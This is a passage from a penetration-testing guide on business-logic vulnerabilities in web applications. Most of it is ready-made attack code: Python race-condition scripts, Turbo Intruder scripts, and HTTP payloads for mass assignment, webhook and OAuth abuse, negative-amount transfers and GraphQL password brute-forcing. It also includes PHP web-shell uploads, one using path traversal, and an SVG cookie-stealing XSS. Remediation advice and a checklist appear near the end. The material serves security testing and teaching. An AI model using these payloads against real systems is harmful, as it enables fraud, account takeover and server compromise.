threads = [threading.Thread(target=like_post) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
# Post receives 50 likes from single user
```

```python [Invitation Race — Exceed Limit]
import threading
import requests

def send_invite():
    requests.post("http://target.com/api/invite",
        json={"email": f"user{threading.current_thread().name}@test.com"},
        headers={"Authorization": "Bearer TOKEN"})

# User has 5 invite limit, send 50 simultaneously
threads = [threading.Thread(target=send_invite) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
# All 50 may succeed before limit is checked
```

```python [File Upload Race — Bypass Size/Type Check]
import threading
import requests

def upload_malicious():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
    requests.post("http://target.com/upload",
        files=files,
        cookies={"session": "SESSION"})

def delete_check():
    # The server checks and deletes malicious files after upload
    # But during the race window, the file exists
    requests.get("http://target.com/uploads/shell.php?cmd=id")

# Upload and access simultaneously
for _ in range(100):
    threading.Thread(target=upload_malicious).start()
    threading.Thread(target=delete_check).start()
```

```python [Account Registration Race — Duplicate Username]
import threading
import requests

def register():
    requests.post("http://target.com/register",
        json={
            "username": "admin",  # Already taken
            "password": "password123",
            "email": f"test{threading.current_thread().name}@test.com"
        })

# Race to create account with existing username
threads = [threading.Thread(target=register) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
# May create duplicate 'admin' account
```
::

### Turbo Intruder (Burp Suite)

::collapsible
---
label: "Burp Suite Turbo Intruder Script for Race Conditions"
---

```python [race_condition.py — Turbo Intruder]
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # Queue the same request 50 times
    for i in range(50):
        engine.queue(target.req, target.baseInput)

def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)
```

```python [race_condition_last_byte.py — Single Packet Attack]
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=50,
                          pipeline=False)
    
    # Use "last byte synchronization" for precise timing
    # Hold back the last byte of each request
    # Release all last bytes simultaneously
    
    for i in range(50):
        engine.queue(target.req, target.baseInput, gate='race1')
    
    # Open the gate — all requests complete simultaneously
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```
::

---

## API & Integration Logic Flaws

### API Logic Exploitation

::collapsible
---
label: "REST API Business Logic Attacks"
---

```http [Mass Assignment — Hidden Admin Field]
# API documentation shows:
# POST /api/users — Creates user with {name, email, password}
# But the User model also has: is_admin, role, balance, verified

POST /api/users HTTP/1.1
Content-Type: application/json

{
  "name": "Attacker",
  "email": "attacker@evil.com",
  "password": "password123",
  "is_admin": true,
  "role": "superadmin",
  "balance": 999999,
  "verified": true,
  "email_confirmed": true
}
```

```http [API Rate Limit — Different Endpoints]
# Rate limited endpoint:
GET /api/v2/users/search?q=john     # 429 Too Many Requests

# Same data via different endpoints:
GET /api/v1/users/search?q=john     # No rate limit on v1
GET /api/users?filter[name]=john    # Different parameter format
POST /graphql                        # GraphQL query for same data
GET /api/export?type=users&q=john   # Export endpoint
```

```http [Batch API — Bypass Per-Request Limits]
POST /api/batch HTTP/1.1
Content-Type: application/json

{
  "requests": [
    {"method": "POST", "url": "/api/transfer", "body": {"amount": 100, "to": "attacker"}},
    {"method": "POST", "url": "/api/transfer", "body": {"amount": 100, "to": "attacker"}},
    {"method": "POST", "url": "/api/transfer", "body": {"amount": 100, "to": "attacker"}},
    {"method": "POST", "url": "/api/transfer", "body": {"amount": 100, "to": "attacker"}},
    {"method": "POST", "url": "/api/transfer", "body": {"amount": 100, "to": "attacker"}}
  ]
}
# Single batch request processes 5 transfers
# Rate limit counts it as 1 request
```

```http [GraphQL Batch Query — Bypass Rate Limit]
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "{ 
    a1: login(username: \"admin\", password: \"password1\") { token }
    a2: login(username: \"admin\", password: \"password2\") { token }
    a3: login(username: \"admin\", password: \"password3\") { token }
    a4: login(username: \"admin\", password: \"password4\") { token }
    a5: login(username: \"admin\", password: \"password5\") { token }
  }"
}
# 5 login attempts in 1 HTTP request
# Rate limiter sees 1 request
```

```http [Webhook Manipulation — Change Callback URL]
PUT /api/webhooks/payment-notification HTTP/1.1
Content-Type: application/json

{
  "url": "http://attacker.com/fake-payment-success",
  "events": ["payment.completed"]
}
# Attacker's server always responds with "payment successful"
# Application trusts the webhook response
```

```http [API Key Scope Bypass]
# API key has "read-only" scope
GET /api/data HTTP/1.1
X-API-Key: READ_ONLY_KEY        # 200 OK

# Try write operations with read-only key
POST /api/data HTTP/1.1
X-API-Key: READ_ONLY_KEY        # May succeed if scope not checked per-operation
Content-Type: application/json

{"data": "unauthorized write"}
```

```http [Pagination — Data Leak]
GET /api/users?page=1&per_page=10 HTTP/1.1

# Override pagination limit
GET /api/users?page=1&per_page=999999 HTTP/1.1
# Dump all users in one request

# Negative page number
GET /api/users?page=-1&per_page=10 HTTP/1.1
# May return unexpected data or internal records
```

```http [Filter Bypass — Access All Records]
# Normal: only see your records
GET /api/orders?user_id=MY_ID HTTP/1.1

# Remove filter to see all records
GET /api/orders HTTP/1.1

# Wildcard filter
GET /api/orders?user_id=* HTTP/1.1
GET /api/orders?user_id= HTTP/1.1
GET /api/orders?user_id[]=1&user_id[]=2&user_id[]=3 HTTP/1.1
```

```http [Search/Export Sensitive Data]
# Search function returns more data than display function
GET /api/users/search?q=admin HTTP/1.1
# Response includes: id, name, email, password_hash, ssn, phone

# Export function bypasses field-level access control
GET /api/users/export?format=csv HTTP/1.1
# CSV contains all fields including sensitive ones
```
::

### Third-Party Integration Exploitation

::collapsible
---
label: "Payment Gateway & OAuth Integration Flaws"
---

```http [Payment Callback Forgery]
# Application expects payment callback from payment provider
POST /api/payment/callback HTTP/1.1
Content-Type: application/json

{
  "transaction_id": "TXN-123",
  "status": "completed",
  "amount": 0.01,
  "order_id": "ORD-5000"
}
# If application doesn't verify callback signature/source
# Attacker sends fake "payment completed" notification
```

```http [Payment Amount Mismatch]
# Step 1: Create order for $500
POST /checkout
{"items": [...], "total": 500}
# Response: {"order_id": "ORD-123", "payment_url": "..."}

# Step 2: At payment gateway, modify amount to $0.01
# Step 3: Complete payment for $0.01
# Step 4: Payment callback says "completed" 
# Step 5: Application marks order as paid without verifying amount
```

```http [OAuth State Parameter Abuse]
# OAuth without state parameter — CSRF attack
GET /oauth/callback?code=AUTH_CODE HTTP/1.1
# Attacker tricks victim into clicking this URL
# Victim's account gets linked to attacker's OAuth account
```

```http [OAuth Token Exchange — Wrong Client]
POST /oauth/token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=VICTIM_AUTH_CODE&client_id=ATTACKER_APP&client_secret=ATTACKER_SECRET&redirect_uri=https://attacker.com/callback
# Exchange victim's auth code with attacker's client credentials
```

```http [SSO Assertion Manipulation]
# SAML Response manipulation
# Change NameID to admin user
# Change role attributes
# If signature verification is weak or missing
```

```http [Webhook Replay Attack]
# Capture a legitimate payment webhook
# Replay it to trigger order fulfillment again
# Get the same product shipped twice
POST /api/webhook/payment HTTP/1.1
Content-Type: application/json
X-Webhook-Signature: CAPTURED_VALID_SIGNATURE

{"event": "payment.completed", "order_id": "ORD-5000"}
# If app doesn't track processed webhook IDs
```
::

---

## Feature & Functionality Abuse

### Notification & Communication Abuse

::collapsible
---
label: "Email, SMS & Notification Exploitation"
---

```http [Email Bomb via Notification]
# Trigger bulk notifications to victim's email
POST /api/share HTTP/1.1
Content-Type: application/json

{"document_id": 1, "share_with": "victim@target.com"}

# Repeat 10,000 times via script
# Victim receives 10,000 notification emails
# No rate limit on share notifications
```

```http [SMS Cost Attack]
# Trigger SMS notifications repeatedly
POST /api/send-verification HTTP/1.1
Content-Type: application/json

{"phone": "+1234567890"}
# Each SMS costs the company money
# Repeat to drain SMS budget
```

```http [Password Reset Flood]
# Trigger password reset emails to target
POST /forgot-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
# Repeat rapidly — floods victim's inbox
# Hides legitimate security notifications in noise
```

```http [Notification Content Injection]
POST /api/share HTTP/1.1
Content-Type: application/json

{
  "document_name": "<a href='http://attacker.com/phish'>Click here for document</a>",
  "share_with": "victim@target.com"
}
# Phishing link injected into legitimate notification email
```

```http [Invite Spam — Abuse Referral System]
POST /api/invite HTTP/1.1
Content-Type: application/json

{"emails": ["victim1@test.com", "victim2@test.com", "victim3@test.com"]}
# Mass invite spam from legitimate platform
# Company's email reputation is damaged
```
::

### Search & Export Abuse

::collapsible
---
label: "Search, Export & Data Enumeration"
---

```http [Regex DoS via Search]
GET /api/search?q=((((((((((a*)*)*)*)*)*)*)*)*)*)b HTTP/1.1
# ReDoS — Regular Expression Denial of Service
# Causes server CPU spike if input is used in regex
```

```http [Wildcard Search — Data Dump]
GET /api/search?q=* HTTP/1.1
GET /api/search?q=%25 HTTP/1.1     # SQL wildcard %
GET /api/search?q=.* HTTP/1.1      # Regex match all
GET /api/search?q= HTTP/1.1        # Empty string matches all
```

```http [Export Without Authorization Check]
GET /api/export/users?format=csv HTTP/1.1
# Export endpoint may not check the same permissions as view endpoint
# Downloads complete user database
```

```http [Export Large Dataset — DoS]
GET /api/export/all?format=csv&include_related=true HTTP/1.1
# Generate massive export file
# Consumes server memory and CPU
# May crash the application
```

```http [Search Filter Bypass — Access Hidden Records]
# Normal search shows only active users
GET /api/users/search?q=john&status=active HTTP/1.1

# Remove or change status filter
GET /api/users/search?q=john HTTP/1.1                    # All statuses
GET /api/users/search?q=john&status=deleted HTTP/1.1     # Deleted users
GET /api/users/search?q=john&status=suspended HTTP/1.1   # Suspended users
GET /api/users/search?q=john&include_deleted=true HTTP/1.1
```

```http [Enumeration via Timing]
# Username enumeration
POST /login: username=existing_user&password=wrong     # Response: 500ms
POST /login: username=nonexistent&password=wrong        # Response: 100ms
# Different response times reveal valid usernames

# Email enumeration via registration
POST /register: email=existing@target.com   # "Email already registered"
POST /register: email=new@target.com        # "Registration successful"
```

```http [Autocomplete/Suggestion Data Leak]
GET /api/search/suggest?q=adm HTTP/1.1
# Returns: ["admin", "admin_backup", "admin_test"]
# Reveals usernames through search suggestions

GET /api/search/suggest?q=password HTTP/1.1
# May suggest field names or values containing "password"
```
::

### File Upload Logic Flaws

::collapsible
---
label: "File Upload Business Logic Exploitation"
---

```http [Bypass File Size Limit — Chunked Upload]
# Server limits uploads to 5MB
# But chunked upload endpoint doesn't enforce total size
POST /api/upload/chunk HTTP/1.1
Content-Type: multipart/form-data

# Upload 100 chunks of 4.9MB each = 490MB total
```

```http [File Type Bypass — Double Extension]
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------boundary--
```

```http [Overwrite Existing Files]
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/index.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------boundary--
```

```http [Upload Quota Bypass]
# Free accounts limited to 100MB storage
# But storage is calculated after upload completes
# Upload files rapidly before quota is recalculated

# Or: Upload large file, copy/clone it via API
POST /api/files/copy
{"source": "large_file.zip", "dest": "copy_1.zip"}
POST /api/files/copy
{"source": "large_file.zip", "dest": "copy_2.zip"}
# Copies may not count against quota
```

```http [Profile Picture — Stored XSS via SVG]
POST /api/profile/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="avatar"; filename="avatar.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <circle cx="50" cy="50" r="40"/>
</svg>
------boundary--
```

```http [Metadata Exfiltration — EXIF Data]
# Upload image with EXIF data containing sensitive info
# Application displays EXIF data to other users
# Or EXIF GPS coordinates reveal user location
```
::

---

## Input & Validation Logic Flaws

### Numeric & Boundary Manipulation

::collapsible
---
label: "Numeric Boundary & Type Exploitation"
---

```http [Negative Values]
POST /api/transfer HTTP/1.1
Content-Type: application/json

{"amount": -5000, "to": "victim_account"}
# Deducting negative amount ADDS money to attacker
```

```http [Zero Value]
POST /api/purchase HTTP/1.1
Content-Type: application/json

{"product_id": 100, "price": 0, "quantity": 1}
# Purchase for free
```

```http [Integer Overflow]
POST /api/transfer HTTP/1.1
Content-Type: application/json

{"amount": 2147483648}
# 32-bit integer overflow (2^31)
# May wrap to negative value
# Or: 9999999999999999 for 64-bit overflow
```

```http [Floating Point Precision]
POST /api/transfer HTTP/1.1
Content-Type: application/json

{"amount": 0.1}
# 0.1 in IEEE 754 = 0.10000000000000000555111...
# May cause rounding errors in financial calculations
# Repeat millions of times for significant gain
```

```http [Very Large Quantity]
POST /cart/update HTTP/1.1
Content-Type: application/json

{"item_id": 100, "quantity": 99999999}
# Integer overflow in total calculation
# total = price * quantity = $50 * 99999999 = overflow to small/negative number
```

```http [Very Small Decimal]
POST /api/transfer HTTP/1.1
Content-Type: application/json

{"amount": 0.001}
# Below minimum display precision
# Credits $0.001 but displays as $0.00
# Repeat to accumulate invisible balance
```

```http [Scientific Notation]
POST /api/transfer HTTP/1.1
Content-Type: application/json

{"amount": "1e10"}
# $10,000,000,000 if parsed as number
# May bypass string-based validation that checks for digits
```

```http [NaN / Infinity]
POST /api/calculate HTTP/1.1
Content-Type: application/json

{"value": "NaN"}
{"value": "Infinity"}
{"value": "-Infinity"}
# Unpredictable behavior in calculations
```

```http [String Instead of Number]
POST /api/transfer HTTP/1.1
Content-Type: application/json

{"amount": "one hundred"}
# May cause error that reveals internal information
# Or may be parsed as 0 (silent failure, free transfer)
```

```http [Boolean Instead of Number]
POST /api/transfer HTTP/1.1
Content-Type: application/json

{"amount": true}
# true may be parsed as 1
# false may be parsed as 0
```

```http [Array Instead of Scalar]
POST /api/transfer HTTP/1.1
Content-Type: application/json

{"amount": [100, 200, 300]}
# Unexpected behavior when array is used where scalar expected
```
::

### String & Format Manipulation

::collapsible
---
label: "String Logic & Format Exploitation"
---

```http [Empty String Bypass]
POST /api/update HTTP/1.1
Content-Type: application/json

{"email": "", "password": ""}
# May bypass "required" validation
# Or reset the field to empty/null
```

```http [Very Long String — Buffer/Logic Issues]
POST /api/register HTTP/1.1
Content-Type: application/json

{"username": "AAAAAAAAAA....(10000 chars)....AAAAAAA"}
# May cause truncation that bypasses validation
# Example: "admin              " truncated to "admin"
# Or cause denial of service
```

```http [Unicode Normalization Bypass]
POST /api/register HTTP/1.1
Content-Type: application/json

{"username": "ɑdmin"}
# Unicode character 'ɑ' (U+0251) may normalize to 'a'
# Registering as "admin" through Unicode tricks
```

```http [Null Byte Truncation]
POST /api/update HTTP/1.1
Content-Type: application/json

{"filename": "shell.php%00.jpg"}
# Application sees .jpg extension (valid image)
# Server truncates at null byte → saves as shell.php
```

```http [Case Sensitivity Inconsistency]
# Registration: checks if "admin" exists → not found
POST /register: {"username": "Admin"}

# Login: normalizes to lowercase → "admin"
POST /login: {"username": "Admin", "password": "pass"}
# Logs in as the original "admin" account
```

```http [Email Validation Bypass]
POST /register HTTP/1.1
Content-Type: application/json

{"email": "attacker@target.com\u0000@evil.com"}
# Validation sees: attacker@target.com (valid target.com domain)
# Mail server processes: attacker@target.com\0@evil.com
# Email sent to evil.com
```

```http [Date/Time Manipulation]
POST /api/booking HTTP/1.1
Content-Type: application/json

{
  "check_in": "2024-01-01",
  "check_out": "2023-01-01"
}
# Check-out before check-in
# May calculate negative duration → negative charge → refund
```

```http [Timezone Abuse]
POST /api/event HTTP/1.1
Content-Type: application/json

{
  "deadline": "2024-12-31T23:59:59+14:00"
}
# UTC+14 timezone extends the deadline
# Or use negative offset to make past deadlines appear current
```
::

---

## Privilege Escalation via Business Logic

::note
Business logic flaws often provide **direct privilege escalation** without requiring any technical exploitation. The escalation happens through legitimate application features used in unintended ways.
::

### Escalation Paths

::card-group
  ::card
  ---
  title: "Registration → Admin"
  icon: i-lucide-user-plus
  ---
  Register with hidden admin fields (`is_admin=true`, `role=admin`). If mass assignment isn't prevented, the new account has admin privileges immediately.
  ::

  ::card
  ---
  title: "Profile Update → Privilege Change"
  icon: i-lucide-user-cog
  ---
  Update profile with additional fields not shown in the UI but accepted by the API (`role`, `permissions`, `group`, `is_staff`). API may process all submitted fields.
  ::

  ::card
  ---
  title: "Password Reset → Account Takeover"
  icon: i-lucide-key-round
  ---
  Exploit password reset flaws to reset any user's password, including admin accounts. Common in IDOR-based reset, Host header poisoning, and token reuse attacks.
  ::

  ::card
  ---
  title: "Workflow Skip → Unauthorized Access"
  icon: i-lucide-skip-forward
  ---
  Skip verification, approval, or payment steps to access premium features, admin panels, or restricted resources directly.
  ::

  ::card
  ---
  title: "Race Condition → Resource Duplication"
  icon: i-lucide-copy
  ---
  Duplicate financial transactions, credits, or permissions through TOCTOU race conditions. Escalate from limited resources to unlimited.
  ::

  ::card
  ---
  title: "API Version → Legacy Access"
  icon: i-lucide-git-branch
  ---
  Access older API versions that lack the security controls added in newer versions. Legacy endpoints may have full admin access without authentication.
  ::

  ::card
  ---
  title: "Feature Abuse → Data Access"
  icon: i-lucide-database
  ---
  Exploit export, search, reporting, and notification features to access data beyond your authorization level. These features often bypass the access controls applied to regular data views.
  ::

  ::card
  ---
  title: "Integration Exploit → System Access"
  icon: i-lucide-plug
  ---
  Exploit trust between services. If Service A trusts Service B, compromise Service B's logic to send malicious requests to Service A with elevated privileges.
  ::
::

### Escalation Chain Examples

::steps{level="4"}

#### Self-Registration → Admin Account

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "hacker",
  "password": "password123",
  "email": "hacker@evil.com",
  "role": "admin",
  "is_superuser": true,
  "groups": ["administrators"],
  "permissions": ["*"]
}
```

If even one hidden field is processed, the attacker may gain elevated access.

#### Low-Privilege Account → Access Admin API

```http
# Step 1: Login as regular user
POST /api/login
{"username": "user", "password": "pass"}
# Token: Bearer eyJ...user_token

# Step 2: Access admin endpoints with user token
GET /api/admin/users HTTP/1.1
Authorization: Bearer eyJ...user_token

# Step 3: If admin check is missing, full admin API access
GET /api/admin/config HTTP/1.1
Authorization: Bearer eyJ...user_token

POST /api/admin/users/1/promote HTTP/1.1
Authorization: Bearer eyJ...user_token
Content-Type: application/json
{"role": "admin"}
```

#### Free Tier → Enterprise Features

```http
# Step 1: Sign up for free tier
# Step 2: Intercept feature-check API calls
GET /api/features?plan=free HTTP/1.1

# Step 3: Modify plan parameter
GET /api/features?plan=enterprise HTTP/1.1

# Step 4: If features are controlled client-side
# Modify JavaScript: user.plan = "enterprise"

# Step 5: Access enterprise API endpoints
POST /api/enterprise/analytics HTTP/1.1
POST /api/enterprise/sso/configure HTTP/1.1
POST /api/enterprise/audit-log HTTP/1.1
```

#### Financial Manipulation → Unlimited Balance

```http
# Step 1: Create two accounts (A and B)
# Step 2: Transfer -$10000 from A to B
POST /api/transfer
{"from": "account_A", "to": "account_B", "amount": -10000}
# A gains $10000, B loses $10000

# Step 3: Transfer $10000 from B to A (B now has negative)
# Step 4: Close account B (negative balance written off)
# Step 5: Account A has $10000 profit
```

::

---

## Business Logic Testing Methodology

::steps{level="3"}

### Understand the Application

Before testing, thoroughly understand the application's purpose, features, and business rules.




  ::field{name="User Roles" type="string"}
  Document all user roles and their intended permissions: anonymous, registered, premium, moderator, admin, super-admin.
  ::

  ::field{name="Workflows" type="string"}
  Map all multi-step workflows: registration, checkout, payment, refund, approval, password reset, account deletion.
  ::

  ::field{name="Business Rules" type="string"}
  Identify pricing rules, discount policies, quantity limits, rate limits, geographic restrictions, age verification, and any conditional logic.
  ::

  ::field{name="Data Relationships" type="string"}
  Understand which users own which resources, who can access what, and how resources are shared between users.
  ::

  ::field{name="Integration Points" type="string"}
  Identify payment gateways, OAuth providers, email services, SMS providers, webhook consumers, and third-party APIs.
  ::

  ::field{name="State Machines" type="string"}
  Map all entity state transitions: order statuses, account states, subscription lifecycle, document approval flow.
  ::

### Identify Assumptions

List all assumptions the application makes about user behavior.

Common assumptions to challenge:

| Assumption | Test |
|-----------|------|
| Users will follow the intended workflow order | Skip steps, repeat steps, go backward |
| Numeric inputs will be positive | Test negative, zero, overflow values |
| Users will only access their own data | Test other users' IDs |
| Prices come from the server | Modify client-sent prices |
| One coupon per order | Apply multiple coupons |
| Rate limits prevent abuse | Concurrent requests, IP rotation |
| Users can't see hidden form fields | Inspect source, submit additional fields |
| API endpoints match UI permissions | Test all API endpoints directly |
| Sessions expire properly | Reuse old sessions after logout/password change |
| Callbacks come from trusted sources | Forge payment/webhook callbacks |

### Test Each Category

Systematically test all vulnerability categories.

**Authentication Logic:**
- 2FA bypass, password reset flaws, lockout bypass, session management

**Authorization Logic:**
- IDOR, privilege escalation, role manipulation, access control gaps

**Financial Logic:**
- Price manipulation, negative values, currency abuse, refund exploitation

**Workflow Logic:**
- Step skipping, state manipulation, process reversal

**Race Conditions:**
- Concurrent duplicate requests, TOCTOU exploitation

**Input Logic:**
- Boundary values, type confusion, format manipulation

**API Logic:**
- Mass assignment, parameter pollution, batch abuse, version bypass

**Feature Logic:**
- Search abuse, export exploitation, notification spam, upload bypass

### Document & Report

For each finding, document:
- **Vulnerability description** and business impact
- **Step-by-step reproduction** with request/response pairs
- **Root cause analysis** — why the business logic is flawed
- **Business impact assessment** — financial loss, data breach, reputation damage
- **Remediation recommendation** — specific logic fixes needed

::

---

## Remediation & Defense

::card-group
  ::card
  ---
  title: Server-Side Enforcement
  icon: i-lucide-shield-check
  ---
  **Never trust client input for business-critical values.** Prices, quantities, discounts, roles, and permissions must always be calculated and enforced server-side. The client should only send identifiers, never values.

  ```python
  # WRONG
  price = request.form['price']
  
  # RIGHT
  product = Product.query.get(request.form['product_id'])
  price = product.price
  ```
  ::

  ::card
  ---
  title: Workflow State Machine
  icon: i-lucide-workflow
  ---
  Implement a **strict state machine** for all multi-step processes. Each step must verify the previous step was completed correctly. Store workflow state server-side and validate all transitions.

  ```python
  VALID_TRANSITIONS = {
      'created': ['paid'],
      'paid': ['processing'],
      'processing': ['shipped'],
      'shipped': ['delivered'],
      'delivered': ['refund_requested'],
  }
  
  if new_status not in VALID_TRANSITIONS.get(current_status, []):
      raise InvalidTransition()
  ```
  ::

  ::card
  ---
  title: Authorization at Every Layer
  icon: i-lucide-lock
  ---
  Check authorization for **every request**, not just the initial access. Verify that the authenticated user owns or has permission to access the specific resource being requested. Never rely solely on authentication.
  ::

  ::card
  ---
  title: Atomic Operations
  icon: i-lucide-atom
  ---
  Use **database transactions with proper locking** for financial operations and any check-then-act patterns. Prevent race conditions with `SELECT FOR UPDATE`, optimistic locking, or database-level constraints.

  ```sql
  BEGIN TRANSACTION;
  SELECT balance FROM accounts WHERE id = ? FOR UPDATE;
  -- Balance is now locked for this transaction
  UPDATE accounts SET balance = balance - ? WHERE id = ? AND balance >= ?;
  COMMIT;
  ```
  ::

  ::card
  ---
  title: Rate Limiting & Anti-Automation
  icon: i-lucide-shield
  ---
  Implement **multi-dimensional rate limiting**: per-user, per-IP, per-session, per-endpoint, and global. Use exponential backoff, CAPTCHA for suspicious activity, and detect concurrent request patterns.
  ::

  ::card
  ---
  title: Input Validation — Business Rules
  icon: i-lucide-filter
  ---
  Validate inputs against **business rules**, not just technical formats. Amounts must be positive and within expected ranges. Quantities must be reasonable. Dates must be logical. Currency must match the transaction context.
  ::

  ::card
  ---
  title: Prevent Mass Assignment
  icon: i-lucide-shield-off
  ---
  Explicitly define which fields are allowed in API requests. Use allowlists (not blocklists) for accepted parameters. Never pass raw request data to database models.

  ```python
  # Django — Explicit fields
  class UserSerializer(serializers.ModelSerializer):
      class Meta:
          model = User
          fields = ['name', 'email']  # Only these fields accepted
          read_only_fields = ['is_admin', 'role', 'balance']
  ```
  ::

  ::card
  ---
  title: Cryptographic Integrity
  icon: i-lucide-file-key
  ---
  Sign all sensitive values (prices, tokens, callbacks) with **HMAC** or digital signatures. Verify signatures server-side before processing. Never trust unsigned data from clients or third-party callbacks.
  ::

  ::card
  ---
  title: Audit Logging
  icon: i-lucide-scroll-text
  ---
  Log all business-critical operations with full context: who, what, when, from where, and the result. Monitor logs for anomalous patterns like rapid transactions, unusual amounts, role changes, and workflow violations.
  ::

  ::card
  ---
  title: Idempotency Controls
  icon: i-lucide-repeat
  ---
  Use **idempotency keys** for financial operations. Each transaction should have a unique key that prevents duplicate processing, even if the same request is sent multiple times.

  ```http
  POST /api/transfer HTTP/1.1
  Idempotency-Key: unique-uuid-for-this-transaction
  ```
  ::
::

---

## Business Logic Testing Checklist

::collapsible
---
label: "Comprehensive Testing Checklist"
---

**Authentication:**
- [ ] Can 2FA be bypassed by direct URL access?
- [ ] Are 2FA codes reusable?
- [ ] Is there rate limiting on 2FA attempts?
- [ ] Are backup codes accessible before 2FA completion?
- [ ] Is the 2FA code leaked in the response?
- [ ] Can password reset tokens be reused?
- [ ] Are reset tokens tied to specific users?
- [ ] Is the Host header used in reset emails?
- [ ] Do sessions persist after password change?
- [ ] Do sessions persist after logout?
- [ ] Is account lockout bypassable?

**Authorization:**
- [ ] Can user A access user B's resources (IDOR)?
- [ ] Are admin endpoints accessible to regular users?
- [ ] Does changing HTTP method bypass authorization?
- [ ] Are older API versions less protected?
- [ ] Does the bulk operation endpoint check per-item auth?
- [ ] Are hidden admin parameters accepted during registration?
- [ ] Can roles be modified via profile update API?

**Financial:**
- [ ] Are negative amounts accepted?
- [ ] Is zero amount accepted?
- [ ] Can prices be modified client-side?
- [ ] Do integer overflows affect calculations?
- [ ] Can currency be changed independently?
- [ ] Are coupons reusable?
- [ ] Can multiple coupons stack?
- [ ] Are expired coupons accepted?
- [ ] Can refund amount exceed order total?
- [ ] Is double refund possible?

**Workflow:**
- [ ] Can checkout steps be skipped?
- [ ] Can beneficial steps be repeated?
- [ ] Can completed processes be reversed?
- [ ] Are state transitions validated server-side?
- [ ] Can approval workflows be bypassed?
- [ ] Can trial periods be extended?

**Race Conditions:**
- [ ] Can financial transactions be doubled?
- [ ] Can coupons be used concurrently?
- [ ] Can votes/likes be inflated?
- [ ] Can rate limits be bypassed concurrently?
- [ ] Can file uploads bypass checks via timing?

**API:**
- [ ] Does mass assignment work on any endpoint?
- [ ] Do batch endpoints bypass rate limits?
- [ ] Are webhook callbacks verified?
- [ ] Can pagination limits be overridden?
- [ ] Do search/export bypass access controls?

**Input:**
- [ ] Are boundary values handled correctly?
- [ ] Does type confusion cause issues?
- [ ] Do special characters in names/fields cause logic errors?
- [ ] Are date/time manipulations possible?
- [ ] Does Unicode normalization create bypasses?
::

---

## Tools

::card-group
  ::card
  ---
  title: Burp Suite Professional
  icon: i-lucide-bug
  to: https://portswigger.net/burp
  target: _blank
  ---
  Essential for intercepting and modifying requests. Use Repeater for manual logic testing, Intruder for enumeration, and Turbo Intruder for race conditions. Comparer for response analysis.
  ::

  ::card
  ---
  title: Autorize (Burp Extension)
  icon: i-lucide-shield-check
  to: https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f
  target: _blank
  ---
  Automatically tests authorization by replaying requests with different user sessions. Detects IDOR and broken access control flaws.
  ::

  ::card
  ---
  title: Auth Analyzer (Burp Extension)
  icon: i-lucide-lock-open
  to: https://portswigger.net/bappstore/7db49799266c4f85866f54d9eab82c89
  target: _blank
  ---
  Analyzes authentication and session management. Tests if endpoints are accessible with different authentication levels.
  ::

  ::card
  ---
  title: Turbo Intruder (Burp Extension)
  icon: i-lucide-zap
  to: https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988
  target: _blank
  ---
  High-speed request engine for race condition testing. Supports single-packet attack technique for precise timing.
  ::

  ::card
  ---
  title: OWASP ZAP
  icon: i-lucide-scan
  to: https://www.zaproxy.org/
  target: _blank
  ---
  Open-source web security scanner. Use manual testing tools (Requester, Fuzzer) for business logic testing. Automated scanner helps identify entry points.
  ::

  ::card
  ---
  title: Postman / Insomnia
  icon: i-lucide-send
  to: https://www.postman.com/
  target: _blank
  ---
  API testing tools for crafting complex API requests. Useful for testing mass assignment, parameter manipulation, and API logic flaws.
  ::

  ::card
  ---
  title: Custom Scripts (Python)
  icon: i-lucide-terminal
  to: https://github.com/swisskyrepo/PayloadsAllTheThings
  target: _blank
  ---
  Write custom Python scripts with `requests`, `asyncio`, and `threading` for automated race condition testing, enumeration, and business logic exploitation.
  ::

  ::card
  ---
  title: RaceTheWeb
  icon: i-lucide-timer
  to: https://github.com/TheHackerDev/race-the-web
  target: _blank
  ---
  Dedicated race condition testing tool. Sends multiple identical requests simultaneously to detect TOCTOU vulnerabilities.
  ::

  ::card
  ---
  title: Arjun
  icon: i-lucide-radar
  to: https://github.com/s0md3v/Arjun
  target: _blank
  ---
  Discovers hidden API parameters. Essential for finding mass assignment targets and hidden administrative parameters.
  ::
::